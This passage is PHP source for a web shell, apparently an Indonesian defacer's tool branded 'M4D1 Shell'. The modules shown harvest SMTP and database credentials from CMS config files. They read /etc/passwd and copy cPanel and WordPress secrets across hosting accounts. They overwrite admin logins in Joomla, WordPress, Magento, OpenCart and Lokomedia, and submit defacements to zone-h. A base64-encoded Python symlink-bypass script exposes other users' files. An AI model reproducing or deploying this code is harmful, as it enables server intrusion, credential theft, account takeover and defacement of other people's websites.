                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
	Zip($_POST['dir'],$save);
	echo "Done , Save To <b>$save</b>";
	}
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 280px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_unzip' style='width: 280px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 200px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Successfull!! , Location : <b>'.$save.'</b>';
	} else {
	echo 'Failure!!';
	}
	}
echo '</tr></table>';	
	}
if($_GET['do'] == 'smtp') {
	echo "<center>NB : ID = Tools ini work jika dijalankan di dalam folder <u>config</u>( ex: /home/user/public_html/nama_folder_config )<br>
NB : EN = This tool works if run in the <u>config</u> folder( ex:/home/user/public_html/folder_config)</center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
}
if($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='7.htm' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' class='inputz' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB : ID = Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html/<br>
NB : EN = Before using this tool, first upload your deface file in directory /home/user/ and /home/user/public_html/</center>";
	}
}
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='M4DI~UciH4'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}
elseif($_GET['to'] == 'config') {
   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
   $idx = mkdir("M4DI_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("M4DI_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
   echo "<font color=#666>Can't read /etc/passwd</font>";
   } else {
   preg_match_all('/(.*?):x:/', $passwd, $user_config);
   foreach($user_config[1] as $user_3X0RC1ST) {
   $user_config_dir = "/home/$user_M4DI~UciH4/public_html/";
   if(is_readable($user_config_dir)) {
   $grab_config = array(
   "/home/$user_M4DI~UciH4/.my.cnf" => "cpanel",
   "/home/$user_M4DI~UciH4/.accesshash" => "WHM-accesshash",
   "/home/$user_M4DI~UciH4/public_html/vdo_config.php" => "Voodoo",
   "/home/$user_M4DI~UciH4/public_html/bw-configs/config.ini" => "BosWeb",
   "/home/$user_M4DI~UciH4/public_html/config/koneksi.php" => "Lokomedia",
   "/home/$user_M4DI~UciH4/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
   "/home/$user_M4DI~UciH4/public_html/clientarea/configuration.php" => "WHMCS",
   "/home/$user_M4DI~UciH4/public_html/whm/configuration.php" => "WHMCS",
   "/home/$user_M4DI~UciH4/public_html/whmcs/configuration.php" => "WHMCS",
   "/home/$user_M4DI~UciH4/public_html/forum/config.php" => "phpBB",
   "/home/$user_M4DI~UciH4/public_html/sites/default/settings.php" => "Drupal",
   "/home/$user_M4DI~UciH4/public_html/config/settings.inc.php" => "PrestaShop",
   "/home/$user_M4DI~UciH4/public_html/app/etc/local.xml" => "Magento",
   "/home/$user_M4DI~UciH4/public_html/joomla/configuration.php" => "Joomla",
   "/home/$user_M4DI~UciH4/public_html/configuration.php" => "Joomla",
   "/home/$user_M4DI~UciH4/public_html/wp/wp-config.php" => "WordPress",
   "/home/$user_M4DI~UciH4/public_html/wordpress/wp-config.php" => "WordPress",
   "/home/$user_M4DI~UciH4/public_html/wp-config.php" => "WordPress",
   "/home/$user_M4DI~UciH4/public_html/admin/config.php" => "OpenCart",
   "/home/$user_M4DI~UciH4/public_html/slconfig.php" => "Sitelok",
   "/home/$user_M4DI~UciH4/public_html/application/config/database.php" => "Ellislab");
   foreach($grab_config as $config => $nama_config) {
   $ambil_config = file_get_contents($config);
   if($ambil_config == '') {
   } else {	
   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
   fputs($file_config,$ambil_config);
   }
   }
   }      
   }
   }  
   }
   echo "<center><a href='?path=$path/M4DI_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
 
 } 
elseif($_GET['do'] == 'auto_edit_user') {
 if($_POST['hajar']) {
 if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
 echo "username atau password harus lebih dari 6 karakter goblok";
 } else {
 $user_baru = $_POST['user_baru'];
 $pass_baru = md5($_POST['pass_baru']);
 $conf = $_POST['config_dir'];
 $scan_conf = scandir($conf);
 foreach($scan_conf as $file_conf) {
 if(!is_file("$conf/$file_conf")) continue;
 $config = file_get_contents("$conf/$file_conf");
 if(preg_match("/JConfig|joomla/",$config)) {
 $dbhost = ambilkata($config,"host = '","'");
 $dbuser = ambilkata($config,"user = '","'");
 $dbpass = ambilkata($config,"password = '","'");
 $dbname = ambilkata($config,"db = '","'");
 $dbprefix = ambilkata($config,"dbprefix = '","'");
 $prefix = $dbprefix."users";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result['id'];
 $site = ambilkata($config,"sitename = '","'");
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Joomla<br>";
 if($site == '') {
 echo "Sitename => <font color=red>error, gabisa ambil nama domain nya lu buriq</font><br>";
 } else {
 echo "Sitename => $site<br>";
 }
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/WordPress/",$config)) {
 $dbhost = ambilkata($config,"DB_HOST', '","'");
 $dbuser = ambilkata($config,"DB_USER', '","'");
 $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"DB_NAME', '","'");
 $dbprefix = ambilkata($config,"table_prefix  = '","'");
 $prefix = $dbprefix."users";
 $option = $dbprefix."options";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[ID];
 $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[option_value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Wordpress<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/Magento|Mage_Core/",$config)) {
 $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
 $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
 $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
 $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
 $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
 $prefix = $dbprefix."admin_user";
 $option = $dbprefix."core_config_data";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nya lu buriq</font><br>";
 } else {
 $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Magento<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
 $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
 $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
 $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"'DB_DATABASE', '","'");
 $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
 $prefix = $dbprefix."user";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $target = ambilkata($config,"HTTP_SERVER', '","'");
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nya lu buriq</font><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => OpenCart<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
 $dbhost = ambilkata($config,'server = "','"');
 $dbuser = ambilkata($config,'username = "','"');
 $dbpass = ambilkata($config,'password = "','"');
 $dbname = ambilkata($config,'database = "','"');
 $prefix = "users";
 $option = "identitas";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
 $result = mysql_fetch_array($q);
 $target = $result[alamat_website];
 if($target == '') {
 $target2 = $result[url];
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nya lu buriq</font><br>";
 if($target2 == '') {
 $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nya lu buriq</font><br>";
 } else {
 $cek_login3 = file_get_contents("$target2/adminweb/");
 $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
 $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
 $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>Admin login nya gatau gua cok gausah manja cari sendiri</font> ]<br>";
 }
 }
 } else {
 $cek_login = file_get_contents("$target/adminweb/");
 $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
 $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
 $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>Admin login nya gatau gua cok gausah manja cari sendiri</font> ]<br>";
 }
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Lokomedia<br>";
 if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
 echo $url_target2;
 } else {
 echo $url_target;
 }
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 }
 }
 }
 } else {
 echo "<center>
 <h1>Auto Edit User Config</h1>
 <form method='post'>
 DIR Config: <br>
 <input type='text' size='50' name='config_dir' value='$dir'><br><br>
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='M4DI~UciH4' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='M4DI~UciH4' placeholder='pass_baru'><br>
 <input type='submit' name='hajar' class='inputz' value='Gas Njenc!' style='width: 215px;'>
 </form>
 NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )<br>NB : EN = This tool works if run in the <u>config</u> folder( ex:/home/user/public_html/folder_config)<br>
 ";
 }
 
 }

if($_GET['do'] == 'about') {
   ?>
   <tr>
   <td>
   <center>
   <h2 style='color:yellow;'>Shell 404 Not Found</font></h2>
   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4oMc5P1CjTP7YVL0aWuRszdcg92TerrPaoQ&usqp=CAU" width="150" height="150">
   <p style='color: yellow;'>Me:</p>
   <font color="yellow">[</font>
   <marquee behavior="alternate" scrollamount="7" style="width: 40%;">M4DI~UciH4</marquee>
   <font color="red">]</font><br>
   <p style='color: red;'>For You:r:</p>
   <font color="red">[</font>
   <marquee behavior="alternate" scrollamount="7" style="width: 40%;">hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta
aku ingin kamu rm -rf kan semua mantan di otak mu,aku lah root hati kamu
Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu
Dear kamu yang tertulis di halaman defacementku.. Kapan jadi pacarku?
jadi kamu deketin aku cuma mau "cat /etc/passwd"-in aku? Terus kamu hek temen2 kostku, gitu?
kamu tau ga beda'y kamu sama sintax PHP,kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain >_<</marquee>
   <font color="yellow">]</font>
   <p><font color="red">###########$$$$$$$$$$$$########$$$$$###########</font></p>
   <embed src="<?=$music;?>" autostart="TRUE" loop="TRUE" width="0" height="0"></embed>
   </center>
   </td>
   </tr>
   <?php
   } elseif($_GET['hex'] == 'symlinkpy') {
				$sym_dir = mkdir('ia_sympy', 0755);
				chdir('ia_sympy');
				$file_sym = "sym.py";
				$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
				$sym = fopen($file_sym, "w");
				fwrite($sym, base64_decode($sym_script));
				chmod($file_sym, 0755);
				$jancok = exe("python sym.py");
				echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
				
	} elseif($_GET['hex'] == 'symlink2') {

				$dir = path();
				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				$d0mains = @file("/etc/named.conf");
				##httaces
				if ($d0mains) {
					@mkdir("Madi_sym", 0777);
					@chdir("Madi_sym");
					@exe("ln -s / root");
					$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Madi.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
					$fp3 = fopen('.htaccess', 'w');
					$fw3 = fwrite($fp3, $file3);
					@fclose($fp3);
					echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
					$dcount = 1;
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www." . $domains[1][0] . "/><font class=txt>" . $domains[1][0] . "</font></a></td>
<td>" . $user['name'] . "</td>
<td><a href='$full/
DirectoryIndex Madi_sym/root/home/" . $user['name'] . "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
								flush();
								$dcount++;
							}
						}
					}
					echo "</table>";
				} else {
					$TEST = @file('/etc/passwd');
					if ($TEST) {
						@mkdir("
DirectoryIndex Madi_sym", 0777);
						@chdir("
DirectoryIndex Madi_sym");
						exe("ln -s / root");
						$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex 
DirectoryIndex Madi.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
						$fp3 = fopen('.htaccess', 'w');
						$fw3 = fwrite($fp3, $file3);
						@fclose($fp3);
						echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
						$dcount = 1;
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						while (!feof($file)) {
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/", "", $matches[1]);
							if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
							echo "<td align=center><font class=txt><a href=$full/
DirectoryIndex Madi_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
							$dcount++;
						}
						fclose($file);
						echo "</table>";
					} else {
						if ($os != "Windows") {
							@mkdir("
DirectoryIndex Madi_sym", 0777);
							@chdir("
DirectoryIndex Madi_sym");
							@exe("ln -s / root");
							$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex 
DirectoryIndex Madi.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
							$fp3 = fopen('.htaccess', 'w');
							$fw3 = fwrite($fp3, $file3);
							@fclose($fp3);
							echo "
 <h2><center>Symlink2 M4D1 Shell</center></h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
							$temp = "";
							$val1 = 0;
							$val2 = 1000;
							for (; $val1 <= $val2; $val1++) {
								$uid = @posix_getpwuid($val1);
								if ($uid) $temp .= join(':', $uid) . "\n";
							}
							echo '<br/>';
							$temp = trim($temp);
							$file5 =
								fopen("test.txt", "w");
							fputs($file5, $temp);
							fclose($file5);
							$dcount = 1;
							$file =
								fopen("test.txt", "r") or exit("Unable to open file!");
							while (!feof($file)) {
								$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/", "", $matches[1]);
								if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
								echo "<td align=center><font class=txt><a href=$full/
DirectoryIndex Madi_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
								$dcount++;
							}
							fclose($file);
							echo "</table></center>";
							unlink("test.txt");
						} else
							echo "<center><font size=3>Cannot create Symlink</font></center>";
					}
				}
	} elseif($_GET['hex'] == 'symlink') {
				@set_time_limit(0);

				echo "<br><br><center><h2>Symlink M4D1 Shell</h2></center><br><br><center><div class=content>";

				@mkdir('sym', 0777);
				$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
				$write = @fopen('sym/.htaccess', 'w');
				fwrite($write, $htaccess);
				@symlink('/', 'sym/root');
				$filelocation = basename(__FILE__);
